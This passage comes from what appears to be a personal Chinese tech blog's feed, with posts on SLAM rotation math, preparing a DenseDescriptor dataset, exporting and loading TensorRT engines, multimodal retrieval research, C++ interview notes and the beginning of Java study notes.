      <title>3D重建及其深度学习方法的相关论文解析</title>
      <link href="/2021/05/13/2021-05-13-3D%E8%A7%86%E8%A7%89_%E4%B8%89%E7%BB%B4%E9%87%8D%E5%BB%BA_%E5%AE%9E%E4%B9%A0/"/>
      <url>/2021/05/13/2021-05-13-3D%E8%A7%86%E8%A7%89_%E4%B8%89%E7%BB%B4%E9%87%8D%E5%BB%BA_%E5%AE%9E%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>最近实习在读浙大最近的NeuralRecon，里面涉及到一些3D点云处理的数学方法和3DVison的深度学习Tricks，主要包括TSDF算法，特征点提取的SIFT、ORB两种算法，及稀疏卷积等，以及SLAM(simultaneous localization and mapping)基础，从《视觉SLAM十四讲》（高翔等）学习基础。双目算法现在已经比较成熟，目前自己工作只涉及单目相机。</p><a id="more"></a><h2 id="SLAM框架"><a href="#SLAM框架" class="headerlink" title="SLAM框架"></a>SLAM框架</h2><h3 id="视觉里程计（Visual-Odometry）"><a href="#视觉里程计（Visual-Odometry）" class="headerlink" title="视觉里程计（Visual Odometry）"></a>视觉里程计（Visual Odometry）</h3><p>目前项目的硬件设备由单目相机获取信息，进而进行姿态估计、深度估计等计算。<br>简单来说，VO是由相邻两张图片间像素的位置关系估计相机的位置，</p><h4 id="坐标变换-旋转矩阵"><a href="#坐标变换-旋转矩阵" class="headerlink" title="坐标变换 旋转矩阵"></a>坐标变换 旋转矩阵</h4><p>求相机坐标系（o）到世界坐标系（w）下的旋转矩阵$R^o_w$，进行欧式变换可以将o下的向量$p_o$ 转换到w下向量$p_w$<br>求出刚体旋转矩阵$R^o_w$，那么w下向量$p_w$左乘R就可以转化到$p_o$:<br>$p_o = R^o_w  \cdot\ p_w$<br>同理如果两个坐标系下的旋转矩阵可以得到<br>$$m = $$<br><strong>eg.</strong> 下面是由w到o1 和o2两个旋转矩阵传递得到的o1 -&gt; o2的旋转矩阵<br>设两个相机坐标系下o1,o2对应的三个点a b c，d e f，各获得两个向量 $m1,n1$,$m2,n2$<br>分别构建出该点集合所在的坐标系方程，求解得到世界坐标到o1 , o2的旋转坐标$R_1,R_2$， 则有：世界坐标系向量$m2 = R_1^T \cdot R_2 \cdot m1$</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">def RigidBody_Transform(p=np.zeros((3,3),dtype=float), q=np.zeros((3,3),dtype=float)):</span><br><span class="line">    # 世界坐标到 O1的旋转矩阵 ，x = x / ||x|| 单位化</span><br><span class="line">    x = (p[1,:] - p[0,:]) / np.linalg.norm(p[1,:] - p[0,:]) </span><br><span class="line">    y = (p[2,:] - p[1,:]) - np.inner(np.inner((p[2,:] - p[1,:]),x), x)</span><br><span class="line">    y = y / np.linalg.norm(y) # y_bar = y / ||y|| # 单位化第二行</span><br><span class="line">    print(&quot;x&quot;,x)</span><br><span class="line">    print(&quot;y&quot;,y)</span><br><span class="line">    z = np.cross(x, y) #叉乘</span><br><span class="line">    print(&quot;z&quot;,z)</span><br><span class="line">    rotate_matrix_w2o1 = np.array([x, y, z])</span><br><span class="line">    # 世界坐标到  O2的转转矩阵</span><br><span class="line">    x_new = (q[1,:] - q[0,:]) / np.linalg.norm(q[1,:] - q[0,:]) </span><br><span class="line">    y_new = (q[2,:] - q[1,:]) - np.inner(np.inner((q[2,:] - q[1,:]),x_new), x_new)</span><br><span class="line">    y_new = y_new / np.linalg.norm(y_new)</span><br><span class="line">    # 这里要注意，叉积（cross product）和 外积（outer product）不一样</span><br><span class="line">    # ps:国内教材讲的是叉积和外积一样</span><br><span class="line">    # np.cross算叉积 ，np.outer算外积</span><br><span class="line">    z_new = np.cross(x_new, y_new) #这要计算的是叉积（只有三维空间有意义，就是右手系的那个）</span><br><span class="line">    rotate_matrix_w2o2 = np.array([x_new, y_new, z_new])</span><br><span class="line">    return rotate_matrix_w2o1,rotate_matrix_w2o2, (rotate_matrix_w2o1.T * rotate_matrix_w2o2)</span><br><span class="line"></span><br><span class="line">#p = np.array([(-47.34,-18.71,-155.02), (-73.64,-29.82,-210.88), (-64.88,-36.77,-216.15)])</span><br><span class="line">#p = np.array([(-4.34,-36.71,51), (-30,25.5,-4), (-21,18,-10.15)])</span><br><span class="line">#q = np.array([(-40,25.5,6), (-30,25.5,-4), (15.01,55.19,22.818)])</span><br><span class="line">p = np.array([(0,1,0), (0,0,0), (0,0,1)])</span><br><span class="line">q = np.array([(0,-1,0), (0,0,0), (0,0,-1)])</span><br><span class="line">m1,m2,rotate_matrix = RigidBody_Transform(p, q)</span><br><span class="line">print(&quot;rotate_matrix is:\n&quot;)</span><br><span class="line">print(rotate_matrix)</span><br></pre></td></tr></table></figure><h4 id="旋转向量"><a href="#旋转向量" class="headerlink" title="旋转向量"></a>旋转向量</h4><p>上面的旋转矩阵表示具有局限性，原因是求出的矩阵必须是正交阵，优化时比较困难，并且计算量比较大，需要进行矩阵运算，一次运算需要9次浮点乘法，所以又提出一个用<strong>旋转角和旋转轴</strong>表示一个<strong>旋转向量</strong>的描述旋转的方法。同时，旋转向量也可以转换成旋转矩阵:<br>由<strong>罗德里格斯公式(Rodrigus’ Formula)</strong>，n_r 即n^，表示向量n到n对应的反对称矩阵的转换符，计算如下：</p><p>$a \times b=\begin{Vmatrix} e_1&amp;e_2&amp;e_3\\a_1&amp;a_2&amp;a_3\\b_1&amp;b_2&amp;b_3 \end{Vmatrix}=\begin{bmatrix} a_2b_3-a_3b_2\\a_3b_1-a_1b_3\\a_1b_2-a_2b_1 \end{bmatrix}=\begin{bmatrix}0&amp;-a_3&amp;a_2\\a_3&amp;0&amp;-a_1\\ -a_2&amp;a_1&amp;0\end{bmatrix} \cdot b = a$^$b$<br>上面的$a$^ 表示其对应的反对称矩阵<br>$R = cos \theta I  + (1-cos\theta) n \cdot n^T + sin\theta n$^<br>求转角$\theta$，可以：<br>$tr(R)= \cos\theta tr(I) +(1-\cos\theta)tr(n \cdot n^T) +\sin\theta tr(n$^$)$<br>$\quad\quad =3\cos\theta +(1-\cos\theta) = 1+2\cos\theta$<br>求出$\theta = \arccos \frac{tr(R)-1}{2}$</p><h3 id="回环检测（Loop-Closure-Detection）"><a href="#回环检测（Loop-Closure-Detection）" class="headerlink" title="回环检测（Loop Closure Detection）"></a>回环检测（Loop Closure Detection）</h3><p>判断镜头是否到达过先前位置，和后端（优化）解决因里程计每次计算相邻两张图片的位置关系，每次前后误差叠加出现的<strong>漂移</strong>问题，简而言之就是校正。</p><h3 id="后端优化（非线性）"><a href="#后端优化（非线性）" class="headerlink" title="后端优化（非线性）"></a>后端优化（非线性）</h3><p>接受VO获得的相机位姿、回环检测</p><h3 id="建图"><a href="#建图" class="headerlink" title="建图"></a>建图</h3><p>还没整理好</p><h2 id="3D点云模型"><a href="#3D点云模型" class="headerlink" title="3D点云模型"></a>3D点云模型</h2><h3 id="相机模型"><a href="#相机模型" class="headerlink" title="相机模型"></a>相机模型</h3><p>相机模型得到的相机内参(camera_intrinsic_perview)一般为一张图得到一个<br>通过两种模型<strong>针孔模型（PINHOLE，还有放射模型RADIAL）</strong>，<strong>畸变模型</strong>两种实现内参计算</p>]]></content>
      
      
      <categories>
          
          <category> 3DPointCloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DeepLearning </tag>
            
            <tag> 3DVision </tag>
            
            <tag> 3DPointCloud </tag>
            
            <tag> SLAM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NeuralRecon for 3D reconstruction in real-time</title>
      <link href="/2021/05/11/2021-05-11-summary_neucon/"/>
      <url>/2021/05/11/2021-05-11-summary_neucon/</url>
      
        <content type="html"><![CDATA[<p>图像pair 提取特征点算法<br>SIFT<br>SURF<br>ORB</p><a id="more"></a>]]></content>
      
      
      <categories>
          
          <category> 3D vision </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 3DVision Projection TSDF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DenseDescriptor for SfM Datasset Preparation</title>
      <link href="/2021/04/19/2021-04-20-DenseDescriptor/"/>
      <url>/2021/04/19/2021-04-20-DenseDescriptor/</url>
      
        <content type="html"><![CDATA[<p>一些单目三维重建的概念，及DepthEstimation代码的阅读</p><a id="more"></a><h2 id="4-19日-4月21日"><a href="#4-19日-4月21日" class="headerlink" title="4-19日-4月21日"></a>4-19日-4月21日</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Colmap提取的数据，SFMDataset用来初始化</span><br><span class="line"></span><br><span class="line">ColMap提取SFM数据，作为训练数据集，读取及处理方式</span><br></pre></td></tr></table></figure><h2 id="SLAM和ColMap两个生成数据-输入到DenseDescriptor的兼容性"><a href="#SLAM和ColMap两个生成数据-输入到DenseDescriptor的兼容性" class="headerlink" title="SLAM和ColMap两个生成数据,输入到DenseDescriptor的兼容性"></a>SLAM和ColMap两个生成数据,输入到DenseDescriptor的兼容性</h2><p>class:<br>SFMDataset</p><ul><li>Format</li></ul><hr><p>image_file_names        拆好的图像序列，有序<br>folder_list             data里面的文件夹train/data/1 train/data/2<br>adjandance_range        1 50 邻接范围,控制1-50的随机增量<br>image_downsampling      2.5 图像下采样倍数 resize到 原来的2.5x<br>network_downsampling    64 for downsample and crop mask的参数<br>inlier_percentage       0.99 阈值ground truth<br>load_intermediate_data  True/False 是否加载预计算数据，存在precompute的pickle文件里precompute.pkl<br>intermediate_data_root  precompute文件⬆️的path<br>sampling_size           10<br>heatmap_sigma        5.0 热图参数，用于generate_heatmap_from_locations,生成训练的sourcemap和targetmap<br>pre_workers             4<br>visible_interval         可视化间隔，，用在overlap点云的函数里，和读取colmapresult的函数一起预处理，避免点云密集，可以调整该参数控制稀疏程度。</p><h2 id="num-iter-每个epoch的迭代次数，训练的时候在看"><a href="#num-iter-每个epoch的迭代次数，训练的时候在看" class="headerlink" title="num_iter              每个epoch的迭代次数，训练的时候在看"></a>num_iter              每个epoch的迭代次数，训练的时候在看</h2><ul><li>precompute.pkl 按作者计算的程序来吧，反正按路径来就没问题</li></ul><hr><pre><code>      crop_positions_per_seq    selected_indexed_per_seqvisible_view_indexes_per_seq     point_cloud_per_seq    intrinsic_matrix_per_seq       mask_boundary_per_seq  view_indexes_per_point_per_seq      extrinsics_per_seq      projection_per_seq    clean_point_list_per_seq    image_downsampling   //这三个是    network_downsampling    inlier_percentage    // 符合ground trueth的阈值     estimated_scale_per_seq</code></pre><hr><h3 id="使用tensorrt生成engine进行推理"><a href="#使用tensorrt生成engine进行推理" class="headerlink" title="使用tensorrt生成engine进行推理"></a>使用tensorrt生成engine进行推理</h3><p><a href="https://zhuanlan.zhihu.com/p/351426774" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/351426774</a><br>c++ 写法、思路如下</p><ul><li><p>先将pytorch的Network先转成onnx模型。<br>如果使用DataParallel进行多GPU训练的话，需要注意节点前面的Module.<br>注意版本，某些函数是onnx默认运算符集不支持的函数，比如forbenius norm，只能转成Aten运算符，Aten运算符竟然没找到很好的文档，为了避免风险升级pytorch到 1.6，将运算符集合版本导出为11，支持了现在的大多数函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code here</span><br></pre></td></tr></table></figure></li><li><p>导出onnx在netron看一下，没问题就可以开始用C++转Trt模型，主要包括加载、解析onnx，序列化两个操作进行</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> trtEngineName = <span class="string">"out.engine"</span>;</span><br><span class="line">sammple::Logger glogger; </span><br><span class="line">nvinfer1::IBuilder* builder = createInferBuilder(gLogger.getTRTLogger());<span class="comment">//createInferBuilder(ILogger&amp; logger);</span></span><br><span class="line">INetWorkDefinition* network = builder-&gt;createNetWorkV2(maxBatchSize);<span class="comment">//</span></span><br><span class="line">IBuilderConfig*     config  = builder-&gt;createBuilderConfig();</span><br><span class="line"><span class="keyword">auto</span> parser  =nvonnxparser::createParser(*network,gLogger.getTRTLogger());<span class="comment">// a parser for onnx</span></span><br><span class="line"></span><br><span class="line">builder-&gt;setMaxWorkspaceSize(<span class="number">1</span>_GiB);<span class="comment">//NVIDIA document claims "lets TensorRT pick any algorithm available."</span></span><br><span class="line">config-&gt;setMaxWorkspaceSize(<span class="number">1</span>_GiB);</span><br><span class="line"></span><br><span class="line">builder-&gt; setFp16Mode(gArgs.runInFp16);<span class="comment">//two inference mode, FP16 and Int8, Float16 is okay</span></span><br><span class="line"></span><br><span class="line">samplesCommon::enableDLA(builder, config, gArgs.useDLACore);<span class="comment">// DLA is to accelerate some layer // DALI to accelerate data reading</span></span><br><span class="line"></span><br><span class="line">ICudaEngine* engine = builder-&gt;buildCudaEngine(*network);<span class="comment">// build cudaengine of "NvInferRuntime.h"</span></span><br><span class="line"></span><br><span class="line">IHostMemory* trtModel = <span class="literal">nullptr</span>;<span class="comment">// init stream as null point</span></span><br><span class="line">trtModel = engine -&gt;serialize(); <span class="comment">// serialize the onnx model</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="function">ofstream <span class="title">ofs</span><span class="params">(trtEngineName.c_str(), <span class="built_in">std</span>::ios::out | <span class="built_in">std</span>::ios::binary)</span></span>;</span><br><span class="line">ofs.write((<span class="keyword">char</span>*)(trtModel-&gt;data()), trtModel-&gt;size());</span><br><span class="line">ofs.close();</span><br></pre></td></tr></table></figure></li><li><p>上一步导出的模型为out.engine，下一步加载该TRT model（或CudaEngine）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TensorRT</span> &#123;</span></span><br><span class="line">IExecutionContext* context;</span><br><span class="line">ICudaEngine* engine;</span><br><span class="line">IRuntime* runtime;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">TensorRT* <span class="title">LoadNet</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* trtFileName)</span></span>&#123;</span><br><span class="line"><span class="built_in">std</span>::<span class="function">ifstream <span class="title">t</span><span class="params">(trtFileName, <span class="built_in">std</span>::ios::in | <span class="built_in">std</span>::ios::binary)</span></span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">stringstream</span> tempStream;</span><br><span class="line">tempStream &lt;&lt; t.rdbuf();</span><br><span class="line">t.close();</span><br><span class="line">DebugP(<span class="string">"TRT File Loaded"</span>);</span><br><span class="line"></span><br><span class="line">tempStream.seekg(<span class="number">0</span>, <span class="built_in">std</span>::ios::end);</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> modelSize = tempStream.tellg();</span><br><span class="line">tempStream.seekg(<span class="number">0</span>, <span class="built_in">std</span>::ios::beg);</span><br><span class="line"><span class="keyword">void</span>* modelMem = <span class="built_in">malloc</span>(modelSize);</span><br><span class="line">tempStream.read((<span class="keyword">char</span>*)modelMem, modelSize);</span><br><span class="line"></span><br><span class="line">IRuntime* runtime = createInferRuntime(gLogger);</span><br><span class="line"><span class="keyword">if</span> (runtime == <span class="literal">nullptr</span>)</span><br><span class="line">&#123;</span><br><span class="line">DebugP(<span class="string">"Build Runtime Failure"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (gArgs.useDLACore &gt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">runtime-&gt;setDLACore(gArgs.useDLACore);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ICudaEngine* engine = runtime-&gt;deserializeCudaEngine(modelMem, modelSize, <span class="literal">nullptr</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (engine == <span class="literal">nullptr</span>)</span><br><span class="line">&#123;</span><br><span class="line">DebugP(<span class="string">"Build Engine Failure"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">IExecutionContext* context = engine-&gt;createExecutionContext();</span><br><span class="line"><span class="keyword">if</span> (context == <span class="literal">nullptr</span>)</span><br><span class="line">&#123;</span><br><span class="line">DebugP(<span class="string">"Build Context Failure"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">TensorRT* trt = <span class="keyword">new</span> TensorRT();</span><br><span class="line">trt-&gt;context = context;</span><br><span class="line">trt-&gt;engine = engine;</span><br><span class="line">trt-&gt;runtime = runtime;</span><br><span class="line">DebugP(<span class="string">"Build trt Model Success!"</span>);</span><br><span class="line"><span class="keyword">return</span> trt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 3DPointCloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 3DPointclouod </tag>
            
            <tag> DeepLearning </tag>
            
            <tag> DepthEstimation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跨媒体检索/多模态计算 方向动态</title>
      <link href="/2021/04/08/2021-04-08-%E5%9B%BE%E5%83%8F%E8%A7%86%E9%A2%91%E4%BF%A1%E6%81%AF%E6%8F%90%E5%8F%96%E4%B8%8E%E6%A3%80%E7%B4%A2/"/>
      <url>/2021/04/08/2021-04-08-%E5%9B%BE%E5%83%8F%E8%A7%86%E9%A2%91%E4%BF%A1%E6%81%AF%E6%8F%90%E5%8F%96%E4%B8%8E%E6%A3%80%E7%B4%A2/</url>
      
        <content type="html"><![CDATA[<p>写在前面：跨媒体检索方向涵盖许多任务，涉及到图像、文本、语音、视频等多种模态的数据，事实上根据项目需求，开发者可以将所需的识别、分割、生成、编码等方法集成到检索或推荐项目中。<br>本文整理了在网络上能搜集到的Baidu、Youtube、Google、Facebook检索系统和大数据架构实现方案当做参考。</p><a id="more"></a><h2 id="多模态信息检索的挑战和攻克方向"><a href="#多模态信息检索的挑战和攻克方向" class="headerlink" title="多模态信息检索的挑战和攻克方向"></a>多模态信息检索的挑战和攻克方向</h2><p>In fact, researchers and algorithm engineers in the field of information retrieval focus more on tasks such as data mining, feature representation, and analysis of user behavior. From the recent conferences  like SIGIR and ACMMM, some research directions retrieved are as follows:<br><em>2021 SIGIR</em><br>Bias and counterfactual learning<br>Recommendation<br>Searching and Ranking<br>Social Aspects<br>Knowledge Structures<br>Question Answering<br>Sequences and Sessions<br>Adversarial Information Retrieval<br>Multi-modal Information Retrieval<br>MultiMedia Information Retrieval<br>Multi-modal Fusion and Embedding<br><em>2020 SIGIR</em></p><p>As noticed, the main modalities are visual, texual, and acoustic.  The challanges lie on <strong>Multimodal Fusion</strong>. Many problems in engeneer often comes to: <em>Infor mation loss</em>, <em>hierachical structure</em></p><h2 id="transductive-learning"><a href="#transductive-learning" class="headerlink" title="transductive learning"></a>transductive learning</h2><p>optimal latent space, can maintance original intrinsic characteristics of microvideo in original space</p>]]></content>
      
      
      <categories>
          
          <category> Multimodal </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ML </tag>
            
            <tag> DL </tag>
            
            <tag> MultiMedia </tag>
            
            <tag> Recommendation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CPP面试</title>
      <link href="/2021/03/26/2021-03-26-cpp%E9%9D%A2%E8%AF%95/"/>
      <url>/2021/03/26/2021-03-26-cpp%E9%9D%A2%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>持续更新</p><a id="more"></a><h2 id="概念性区分"><a href="#概念性区分" class="headerlink" title="概念性区分"></a>概念性区分</h2><p><strong>1.C和C++的区别</strong><br>C面向过程，C++面向对象<br>C的内存管理使用malloc free，C++还可以使用new delete<br>C不支持函数重载，C++支持函数重载<br>C没有引用，C++可以用引用<br><strong>堆和栈的区别</strong><br>stack编译器自动分配和释放，自底向上的数据结构<br>heap需要由程序员手动new delete，会产生外部碎片，是自上到下的数据结构<br><strong>c++中不能被继承的成员函数</strong><br>析构函数和构造函数<br><strong>const</strong><br>定义常量<br>修饰函数参数和函数返回值</p><h2 id="修饰函数定义体，函数为类的成员函数，const修饰后的成员函数不修改成员变量的值"><a href="#修饰函数定义体，函数为类的成员函数，const修饰后的成员函数不修改成员变量的值" class="headerlink" title="修饰函数定义体，函数为类的成员函数，const修饰后的成员函数不修改成员变量的值"></a>修饰函数定义体，函数为类的成员函数，const修饰后的成员函数不修改成员变量的值</h2><p>define给一个立即数，const是常量，放在静态区域，全局变量也在静态区域<br>静态区：static无论是全局变量还是局部变量都存储在全局/静态区域，在编译期就为其分配内存，在程序结束时释放<br>const的全局变量存储在只读数据段，第一次使用时被分配内存，结束时释放；const的局部变量存在栈中，代码块结束释放<br>define定义的常量不可以用指针去指向，const定义的常量可以用指针去指向该常量的地址<br>–const优点<br>const 常量有数据类型，而宏常量没有数据类型。<br>编译器可以对前者进行类型安全检查，<br>后者只进行字符替换，没有类型安全检查，并且在字符替换可能报错。<br>[全局变量放在静态存储区，整个程序开始分配内存，结束释放]<br><strong>static</strong><br>static修饰的变量只能通过其所在文件、模块或函数进行调用，限制变量<br>static修饰的变量一开始就得初始化，并存放于静态内存区<br><strong>volatile</strong><br>本条指令不会因编译器的优化而省略，不会被编译器察觉（隐藏变量），且要求每次重新读取volatile修饰的变量的内容<br><strong>extern</strong></p><p><strong>指针和引用的区别</strong><br>引用本质是只读指针，引用只能在初始化时被赋值,且必须被初始化，之后不能改变，指针是动态的<br>引用不能为NULL，指针可以<br>引用做函数参数时，内部传递的是变量地址<br><strong>进程间通信</strong><br>pipe管道，半双工，用于父子进程通信<br>semaphore信号量，进程同步访问共享资源<br>message que 消息队列，克服了缓冲区限制<br>shared memory共享内存<br>socket<br><strong>线程间通信</strong><br>全局变量   Messages消息机制；<br>CEvent对象（MFC中的一种线程通信对象，通过其触发状态的改变实现同步与通信）</p><p>编译时运算符:sizeof</p><p><strong>写一个函数指针</strong><br><em>( ( void (</em>)() ) 0x100000) ( );<br>void(<em>)()强制转换0x100000<br>typedef void(</em>)() voidFunc;<br>*(  (voidFunc)0x100000 )();</p><p><strong>内存分配方式</strong></p><p>从静态存储区域分配。内存在程序编译的时候就已经分配好，这块内存在程序的整个运行期间都存在。例如全局变量。</p><p>在栈上创建。在执行函数时，函数内局部变量的存储单元都可以在栈上创建，函数执行结束时这些存储单元自动被释放。栈内存分配运算内置于处理器的指令集中，效率很高，但是分配的内存容量有限。</p><p>从堆上分配，亦称动态内存分配。程序在运行的时候用malloc或new申请任意多少的内存，程序员自己负责在何时用free或delete释放内存。动态内存的生存期由我们决定，使用非常灵活，但问题也最多。</p>]]></content>
      
      
      <categories>
          
          <category> CPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CPP，面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/02/24/2021-02-01-Java%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2021/02/24/2021-02-01-Java%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="第一章-Java概述"><a href="#第一章-Java概述" class="headerlink" title="第一章 Java概述"></a>第一章 Java概述</h1><h2 id="1-1-Java历史"><a href="#1-1-Java历史" class="headerlink" title="1.1 Java历史"></a>1.1 Java历史</h2><p>Java诞生于SUN（Stanford University Network），09年SUN被Oracle（甲骨文）收购。</p><p>Java之父是詹姆斯.高斯林(James Gosling)。</p><p>1996年发布JDK1.0版。</p><p>目前最新的版本是Java12。我们学习的Java8。</p><h2 id="1-2-Java语言最主要的特点"><a href="#1-2-Java语言最主要的特点" class="headerlink" title="1.2 Java语言最主要的特点"></a>1.2 Java语言最主要的特点</h2><ul><li>特点一：面向对象</li></ul><p>两个基本概念：类、对象</p><p>三大特性：封装、继承、多态</p><ul><li>特点二：健壮性</li></ul><p>吸收了C/C++语言的优点，但去掉了其影响程序健壮性的部分（如指针、内存的申请与释放等），提供了一个相对安全的内存管理和访问机制</p><ul><li>特点三：跨平台性</li></ul><p>跨平台性：通过Java语言编写的应用程序在不同的系统平台上都可以运行。“Write once , Run Anywhere”一次编写，处处运行。</p><p>原理：只要在需要运行 java 应用程序的操作系统上，先安装一个Java虚拟机 (JVM Java Virtual Machine) 即可。由JVM来负责Java程序在该系统中的运行。因为有了JVM，同一个Java 程序在三个不同的操作系统中都可以执行。这样就实现了Java 程序的跨平台性。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="D:/atguigu/javaee/JavaSE20190503/note/imgs/1557828366412.png" alt="1557828366412" title>                </div>                <div class="image-caption">1557828366412</div>            </figure><h2 id="1-3-Java环境搭建"><a href="#1-3-Java环境搭建" class="headerlink" title="1.3 Java环境搭建"></a>1.3 Java环境搭建</h2><h3 id="1-3-1-JDK、JRE、JVM"><a href="#1-3-1-JDK、JRE、JVM" class="headerlink" title="1.3.1 JDK、JRE、JVM"></a>1.3.1 JDK、JRE、JVM</h3><p>Java开发人员需要安装JDK。如果仅仅是运行Java程序，那么只需要按照JRE。</p><p>JDK（Java Development kits）：Java开发工具包。</p><p>JRE（Java Runtime Environment）：Java运行环境。</p><p>JVM（Java Virtual Machine）：Java虚拟机。</p><p>JDK = JRE + 开发工具（javac.exe,java.exe,javadoc.exe等）</p><p>JRE = JVM + 核心类库（常用类：String、日期时间、数学、集合、IO、网络、多线程等）</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="D:/atguigu/javaee/JavaSE20190503/note/imgs/1553593811117.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="1-3-2-Java环境搭建"><a href="#1-3-2-Java环境搭建" class="headerlink" title="1.3.2  Java环境搭建"></a>1.3.2  Java环境搭建</h3><p>1、安装JDK</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="D:/atguigu/javaee/JavaSE20190503/note/imgs/1553644600381.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>2、配置JDK的开发工具目录到path环境变量中</p><p>​    例如：D:\ProgramFiles\Java\jdk1.8.0_51\bin;</p><p>​    注意：这个安装目录以你自己的安装目录为准</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="D:/atguigu/javaee/JavaSE20190503/note/imgs/1553644724825.png" alt="1553644724825" title>                </div>                <div class="image-caption">1553644724825</div>            </figure><p>（1）为什么配置path？</p><p>​    希望在命令行使用javac.exe等工具时，任意目录下都可以找到这个工具所在的目录。</p><p>（2）如何配置环境变量？</p><p>​    【计算机】右键【属性】，选择【高级系统设置】，选择【高级】，选择【环境变量】，选择【系统环境变量】，编辑path，在【<strong>path原有值</strong>】的前面加入D:\ProgramFiles\Java\jdk1.8.0_51\bin;</p><h2 id="1-4-第一个Java应用程序"><a href="#1-4-第一个Java应用程序" class="headerlink" title="1.4 第一个Java应用程序"></a>1.4 第一个Java应用程序</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        